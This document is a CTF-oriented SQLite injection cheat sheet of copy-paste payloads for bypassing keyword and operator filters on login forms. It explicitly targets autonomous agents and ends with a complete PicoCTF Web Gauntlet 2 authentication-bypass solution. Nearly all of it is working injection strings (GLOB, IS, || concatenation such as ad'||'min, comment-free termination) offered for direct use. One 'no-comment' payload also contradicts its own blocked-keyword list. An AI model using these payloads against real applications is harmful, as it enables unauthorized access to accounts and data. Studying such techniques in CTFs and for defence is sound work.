# SQLite Filter Bypass - CTF Exploitation Reference

> **Document Purpose:** Actionable SQLite filter bypass techniques for CTF challenges where common SQL keywords and operators are blocked. Designed for autonomous agent retrieval with copy-paste payloads.

---

## 1. QUICK REFERENCE: Operator Alternatives

> **When to use this section:** SQL injection is confirmed but common operators (=, OR, AND, --, etc.) are blocked by a WAF or filter.

### 1.1 Equality Operator Alternatives (when `=` is blocked)

**Tags:** `sqlite, filter-bypass, equality, operators`

| Blocked | Alternative | Example |
|---------|------------|---------|
| `=` | `IS` | `username IS 'admin'` |
| `=` | `GLOB` | `username GLOB 'admin'` |
| `=` | `LIKE` | `username LIKE 'admin'` |
| `=` | `BETWEEN x AND x` | `username BETWEEN 'admin' AND 'admin'` |
| `!=` | `IS NOT` | `username IS NOT 'guest'` |

**Copy-paste payloads:**
```
' IS NOT NULL --
admin' AND 1 IS 1 --
' GLOB '*' --
admin' AND username GLOB 'admin
```

### 1.2 Boolean Logic Alternatives (when `OR`/`AND` are blocked)

**Tags:** `sqlite, filter-bypass, boolean, logic, or-alternative`

| Blocked | Alternative | Example |
|---------|------------|---------|
| `OR` | `\|\|` (double pipe) | `1 \|\| 1` |
| `AND` | Use nested conditions | Restructure query |
| `true` | `1` | `' \|\| 1 --` |
| `false` | `0` | `' \|\| 0 --` |

**Copy-paste payloads:**
```
' || 1 --
' || '1
admin' || '
' || 1 || '
```

**Important:** In SQLite, `||` is the string concatenation operator, NOT logical OR. However, when used in boolean context (WHERE clause), non-empty strings are truthy.

---

## 2. Keyword Bypass via Concatenation

> **When to use this section:** A specific keyword like `admin` is blocked by the filter.

### 2.1 String Concatenation with `||`

**Tags:** `sqlite, filter-bypass, concatenation, keyword-bypass, admin`

SQLite's `||` operator concatenates strings. Use it to split blocked keywords:

**Bypassing `admin` filter:**
```
ad'||'min           -> admin (5 chars split as 2+3)
a'||'dmin           -> admin (1+4)
adm'||'in           -> admin (3+2)
admi'||'n           -> admin (4+1)
ad'||'mi'||'n       -> admin (2+2+1)
```

**Real-world payload (PicoCTF Web Gauntlet 2 solution):**
- Username: `ad'||'min'||'`
- This bypasses the `admin` keyword filter while SQLite evaluates it as the string "admin"

### 2.2 Length-Aware Concatenation

**Tags:** `sqlite, filter-bypass, length-constraint, short-payloads`

When there's a length limit (e.g., 35 characters combined for username + password):

| Payload | Length | Bypasses |
|---------|--------|----------|
| `ad'\|\|'min` | 10 | `admin` |
| `ad'\|\|'min'\|\|'` | 14 | `admin` + query completion |
| `' GLOB '*` | 9 | `=` filter |
| `' IS NOT NULL--` | 15 | `=` filter |

**Agent Takeaway:**
- Always check for length constraints (inspect HTML form `maxlength` attributes)
- Shorter payloads are better when length is limited
- `ad'||'min'||'` is only 14 characters and bypasses both `admin` and `=` filters

---

## 3. Comment Bypass Techniques

> **When to use this section:** Comment operators (`--`, `/*`, `*/`, `#`) are all blocked.

### 3.1 No-Comment Query Termination

**Tags:** `sqlite, filter-bypass, comments, no-comment, query-termination`

When ALL comment operators are blocked, you must make the query syntactically valid without comments:

**Strategy: Close the original query structure**
```
' || '                  -> Closes string context with empty concat
'||'                    -> Minimal string closure
' IS NOT NULL OR '1'='1 -> Complete predicate without comments
```

**Example (login form where `--` and `/*` are both blocked):**
- Original query: `SELECT * FROM users WHERE user='INPUT' AND pass='INPUT2'`
- Username: `ad'||'min`
- Password: anything (or `' || '1`)
- Resulting query: `SELECT * FROM users WHERE user='ad'||'min' AND pass='anything'`
- This evaluates `user='admin'` because `||` concatenates the strings

### 3.2 Alternative Comment Styles

**Tags:** `sqlite, comments, alternatives`

```
--     Standard SQL comment (most commonly blocked)
/**/   Block comment
#      MySQL-style comment (NOT valid in SQLite)
;      Statement terminator (try if semicolons aren't blocked)
```

---

## 4. Pattern Matching Bypass

> **When to use this section:** `LIKE` is blocked but you need pattern matching.

### 4.1 GLOB as LIKE Alternative

**Tags:** `sqlite, filter-bypass, glob, pattern-matching, like-alternative`

`GLOB` is case-sensitive and uses different wildcards than `LIKE`:

| LIKE | GLOB | Matches |
|------|------|---------|
| `%` | `*` | Any sequence of characters |
| `_` | `?` | Any single character |

**Copy-paste payloads:**
```
' OR username GLOB 'admin' --
' OR password GLOB '*flag*' --
' OR username GLOB 'a?min' --
' OR username GLOB '[a-z]*' --
```

**Note:** GLOB is case-sensitive in SQLite. `GLOB 'Admin'` won't match `admin`.

---

## 5. Comparison Bypass with BETWEEN

> **When to use this section:** Both `=` and `LIKE`/`GLOB` are blocked.

### 5.1 BETWEEN for Exact Matching

**Tags:** `sqlite, filter-bypass, between, comparison, equality-alternative`

`BETWEEN x AND y` can simulate `=` when x equals y:

```
' OR username BETWEEN 'admin' AND 'admin' --
' OR id BETWEEN 1 AND 1 --
```

**Caution:** `BETWEEN` requires `AND`, so this won't work if `AND` is also blocked.

---

## 6. Complete Filter Bypass Strategy

> **When to use this section:** Multiple keywords are blocked simultaneously (heavy filtering).

### 6.1 Systematic Approach

**Tags:** `sqlite, filter-bypass, strategy, systematic, heavy-filtering`

1. **Enumerate filters first:** Use `filter_enumerator` tool to discover exactly what's blocked
2. **Map blocked to alternatives:**
   - `=` -> `IS` or `GLOB`
   - `OR` -> `||`
   - `AND` -> restructure without AND
   - `admin` -> `ad'||'min`
   - `--` -> close query naturally with `'||'`
   - `LIKE` -> `GLOB`
   - `true`/`false` -> `1`/`0`
3. **Check length constraints** before building final payload
4. **Use `payload_mutator` tool** for automated variant generation

### 6.2 Web Gauntlet 2 Complete Solution (Reference)

**Tags:** `sqlite, web-gauntlet, picoctf, filter-bypass, complete-solution`

**Filters:** `or`, `and`, `true`, `false`, `union`, `like`, `=`, `>`, `<`, `;`, `--`, `/*`, `*/`, `admin`
**Length limit:** 35 characters combined

**Working solution:**
- Username: `ad'||'min'||'`
- Password: (anything, e.g., `a`)

**Why it works:**
- `ad'||'min'||'` concatenates to `admin` (bypasses `admin` filter)
- No `=` operator used
- No `--` comments needed (query closes naturally)
- No `or`/`and` keywords used
- Total length: 14 + 1 = 15 characters (under 35 limit)

**Agent Takeaway:**
- Use `filter_enumerator` to discover what's blocked before crafting payloads
- Use `payload_mutator` with blocked keywords list and max_length for automated bypass generation
- Always prefer the shortest bypass that avoids ALL blocked keywords
- String concatenation with `||` is the most versatile SQLite bypass technique
- When comments are blocked, structure the query to be syntactically valid without them
